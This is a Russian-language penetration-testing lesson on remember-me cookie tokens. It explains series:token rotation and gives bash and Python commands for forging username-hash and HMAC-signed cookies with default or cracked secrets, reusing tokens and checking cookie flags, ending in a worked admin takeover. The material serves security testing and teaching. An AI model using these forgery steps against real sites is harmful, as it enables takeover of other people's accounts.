«Remember me» — функция, которая позволяет не вводить пароль при каждом входе. Технически это долгоживущий токен, хранящийся в cookie, и именно он становится самой ценной целью: если токен подделывается или утекает, атакующий получает аккаунт надолго, часто без возможности пользователя это заметить. Этот урок — про то, как устроены remember-me токены, как их подделывать и красть.

## Как устроены remember-me токены

Классическая схема (по мотивам Spring Security) использует два значения: **series** (идентификатор, постоянный) и **token** (секрет, ротируемый при каждом использовании). В базе хранится хеш токена, привязанный к series.

```
Cookie: remember-me=base64(series:token)
```

При входе: находим запись по series, сверяем хеш token. Если совпал — выдаём новую пару (ротация). Если series есть, а token не совпал — **сигнал кражи**: кто-то использовал старый токен. Хорошая реализация инвалидирует всю серию.

Упрощённые схемы (которые и уязвимы) кладут в cookie **подписанный** username: `base64(user:expiry:signature)` или просто `base64(user:passwordHash)`. Здесь вся защита — в подписи или в хеше пароля.

## Уязвимость 1: токен = username + hash

Если cookie выглядит как `base64(user:md5(password))` или `user:hash`, атакующий может подделать его, зная хеш пароля (а хеши часто утекают через SQLi).

```bash
$ echo 'YWRtaW46NWY0ZGNjM2I1YWE3NjVkNjFkODMyN2RlYjg4MmNmOTk=' | base64 -d
admin:5f4dcc3b5aa765d61d8327deb882cf99      # admin:md5(password)

# подделываем для другого пользователя, если знаем/подберём его хеш
$ echo -n 'administrator:5f4dcc3b5aa765d61d8327deb882cf99' | base64
YWRtaW5pc3RyYXRvcjo1ZjRkY2MzYjVhYTc2NWQ2MWQ4MzI3ZGViODgyY2Y5OQ==
$ curl -s https://t/ -H 'Cookie: remember-me=YWRtaW5pc3RyYXRvcjo1...'
```

## Уязвимость 2: слабая/отсутствующая подпись

Если токен подписан HMAC, но секрет слабый или известный (дефолтный), подпись подделывается.

```bash
# структура: base64(user:expiry):hmac
$ echo 'admin:1893456000:abc123' | base64
YWRtaW46MTg5MzQ1NjAwMDphYmMxMjM=

# подбираем секрет или используем дефолтный (Spring: "SpringSecured")
$ python3 - <<'PY'
import hmac,hashlib,base64
msg=b'admin:1893456000'
sig=hmac.new(b'SpringSecured',msg,hashlib.sha256).hexdigest()
print(base64.b64encode(msg+b':'+sig.encode()).decode())
PY
```

Дефолтные секреты — классика: `changeme`, `secret`, `SpringSecured`, имя приложения.

## Уязвимость 3: нет ротации / нет инвалидации

Если токен не ротируется, украденный токен живёт вечно. Если при несовпадении token не инвалидируется серия — украденный токен продолжает работать даже после смены пароля. Проверяйте: используйте токен дважды и смотрите, меняется ли cookie; меняйте пароль и проверяйте, перестал ли работать старый токен.

```bash
# 1. логинимся, сохраняем remember-me
curl -s -c jar -X POST https://t/login -d 'user=u&pass=p&remember=1'
grep remember jar
# 2. используем токен дважды
curl -s -b 'remember-me=TOKEN' https://t/ -o /dev/null
curl -s -b 'remember-me=TOKEN' https://t/ -o /dev/null   # должен обновиться/сломаться
# 3. меняем пароль и пробуем старый токен
curl -s -b 'remember-me=TOKEN' https://t/me | grep -i 'name\|email'
```

## Уязвимость 4: кража через XSS/сеть

Remember-me cookie долгоживущий и часто **не помечен HttpOnly** (иначе JS не смог бы… хотя обычно помечен). Если HttpOnly отсутствует — XSS читает его напрямую. Если сайт по HTTP хотя бы частично — токен перехватывается по сети. Проверяйте флаги cookie.

```bash
curl -sI https://t/ | grep -i set-cookie
# Set-Cookie: remember-me=...; Path=/; Max-Age=1209600; HttpOnly; Secure; SameSite=Lax
# отсутствие HttpOnly/Secure -> кража через XSS/сеть
```

## Разобранный пример: подделка подписанного токена

```bash
# 1. смотрим свою cookie
$ echo 'dXNlcjoxODkzNDU2MDAwOjEyMzQ1Ng==' | base64 -d
user:1893456000:123456

# 2. видим формат user:expiry:signature и проверяем, что подпись слабая
# 3. подбираем секрет (rockyou/дефолтные) локально
$ hashcat -m 1450 sig.hash wordlist.txt     # HMAC-SHA256 (или скриптом)
# 4. найден секрет "changeme" -> подделываем admin
$ python3 - <<'PY'
import hmac,hashlib,base64
msg=b'admin:1999999999'
sig=hmac.new(b'changeme',msg,hashlib.sha256).hexdigest().encode()
print(base64.b64encode(msg+b':'+sig).decode())
PY
# 5. используем подделанный токен
$ curl -s https://t/me -H 'Cookie: remember-me=<подделка>' | grep -i admin
```

Артефакт — доступ к аккаунту admin без пароля.

## Инструменты и команды

```bash
# декодировать cookie
echo 'BASE64' | base64 -d
# собрать cookie
echo -n 'user:exp: sig' | base64 -w0
# перебор секрета локально (python)
python3 -c "import hmac,hashlib;print(hmac.new(b'changeme',b'user:1893456000',hashlib.sha256).hexdigest())"
# массовая проверка флагов cookie
nuclei -u https://t -tags cookie -silent
```

## Крайние случаи и подводные камни

- **Base64 vs base64url.** Некоторые используют URL-safe алфавит — учитывайте при сборке.
- **Порядок полей.** `user:expiry:sig` и `sig:user:expiry` — разные форматы; смотрите пример.
- **Ротация.** Если token ротируется, повторное использование старого — сигнал и инвалидация.
- **Смена пароля.** Токен должен инвалидироваться; если нет — это отдельная находка.
- **HttpOnly.** Часто забывают; без него XSS крадёт токен.
- **Max-Age.** Долгий срок жизни повышает ценность токена.

## Что делать дальше / решение

1. **Декодируйте cookie** — поймите формат (series:token или user:hash:sig).
2. **Проверьте подпись** — есть ли HMAC, какой алгоритм, какой секрет.
3. **Подберите/угадайте секрет** — дефолтные, слабые, имя приложения.
4. **Проверьте ротацию** — меняется ли token, инвалидируется ли серия.
5. **Проверьте флаги** — HttpOnly, Secure, SameSite.
6. **Соберите PoC** — подделанный токен, дающий доступ.
7. **Тупик** — переходите к refresh-token/JWT-атакам.

## Справочная таблица

| Формат cookie | Слабое место | Атака |
|---------------|--------------|-------|
| `user:hash` | хеш утекает/подбирается | подделка user |
| `user:exp:sig` (HMAC) | слабый секрет | перебор секрета |
| `series:token` | нет ротации | повтор токена |
| `series:token` | нет инвалидации | старый токен после смены пароля |
| без HttpOnly | XSS | кража cookie |
| без Secure | сеть | перехват |

## Глубже: как работает ротация и почему она важна

Ротация токена — ключевой механизм обнаружения кражи. Рассмотрим, как он должен работать и что ломается. При каждом успешном использовании remember-me cookie сервер должен **заменить** и series, и token (или только token), записав новый хеш в базу. Тогда легитимный пользователь всегда имеет «свежий» токен, а украденный старый перестаёт совпадать.

Если атакующий украл токен и использовал его раньше пользователя, произойдёт коллизия: у пользователя окажется «старый» токен, сервер увидит несовпадение и (в хорошей реализации) инвалидирует серию и попросит перелогиниться. Плохие реализации просто выдают новый токен по старому series — и атакующий продолжает пользоваться аккаунтом, а пользователь ничего не замечает.

```bash
# проверяем ротацию: дважды используем один токен
$ curl -s -c j1 -X POST https://t/login -d 'u=me&p=pw&remember=1' >/dev/null
$ T=$(grep remember-me j1 | awk '{print $7}')
$ curl -s -b "remember-me=$T" https://t/ -o /dev/null      # 1-е использование
$ curl -s -b "remember-me=$T" https://t/ -o /dev/null      # 2-е тем же токеном
# если оба прошли -> нет ротации -> токен можно переиспользовать бесконечно
```

Отсутствие ротации — самостоятельная находка, даже если подпись крепкая: украденный токен (через XSS, сеть, бэкап) остаётся валидным навсегда.

## Глубже: смена пароля и инвалидация

Второй важный тест — инвалидация после смены пароля. Хорошая реализация должна сбрасывать все remember-me токены пользователя при смене пароля. Если старый токен продолжает работать — атакующий, укравший токен, сохраняет доступ даже после того, как жертва «починила» безопасность.

```bash
# 1. логин и сохранение токена
$ curl -s -c j -X POST https://t/login -d 'u=me&p=old&remember=1' >/dev/null
$ T=$(grep remember-me j | awk '{print $7}')
# 2. смена пароля
$ curl -s -b j -X POST https://t/password -d 'old=old&new=NewPw1!' >/dev/null
# 3. старый remember-me токен
$ curl -s -b "remember-me=$T" https://t/me | grep -i email
# если вернул данные -> токен не инвалидирован -> находка
```

## Практика: системный аудит

Полный аудит remember-me состоит из последовательности проверок. Сначала декодируйте cookie и определите формат. Затем проверьте, есть ли подпись и какой секрет (попробуйте дефолтные, слабые, имя приложения). Далее проверьте ротацию (дважды используйте токен) и инвалидацию (смена пароля). Затем проверьте флаги cookie (HttpOnly, Secure, SameSite) и, наконец, оцените срок жизни. Каждая проверка заканчивается выводом «уязвимо/нет» с командой и результатом.

Особое внимание уделите случаю, когда remember-me реализован «самопально»: часто это просто `base64(user:expiry)` без подписи, либо подпись MD5 от `user+secret` с секретом-строкой в коде. Такие реализации ломаются мгновенно, как только вы понимаете формат.

## Итог и приоритизация находок

Наиболее критична подделка токена, дающая доступ к чужому аккаунту (особенно админа). Далее — отсутствие ротации и инвалидации (кража сессии бессрочно). Затем — отсутствие HttpOnly/Secure (кража через XSS/сеть). Слабый секрет подписи — тоже критично, если приводит к подделке. Оценивайте находку по тому, какой артефакт вы получили: доступ к чужому аккаунту — высокий/критичный уровень; возможность переиспользовать токен — средний/высокий.

## Сравнение с другими токенами сессии

Remember-me токен — не единственный долгоживущий секрет. Полезно понимать, как он соотносится с обычной сессией, refresh-token и JWT. Обычная сессионная cookie живёт недолго и хранится на сервере; remember-me — долгоживущая и часто «самодостаточная» (подписанная). Refresh-token — долгоживущий токен, обмениваемый на короткий access-token; JWT — самодостаточный токен с подписью. Все они имеют общие слабости: слабый секрет подписи, отсутствие ротации/инвалидации, отсутствие привязки к устройству, утечка через XSS/сеть. Проверяя remember-me, применяйте тот же набор проверок, что и к JWT: подпись, срок, claims, ротация. Разница лишь в том, что remember-me часто реализован «самопально» и хуже спроектирован, поэтому ломается легче.

Если приложение использует и сессию, и remember-me, проверьте, не связаны ли они: иногда remember-me содержит те же claims, что JWT, и подписан тем же секретом — тогда найденный секрет ломает обе системы сразу.
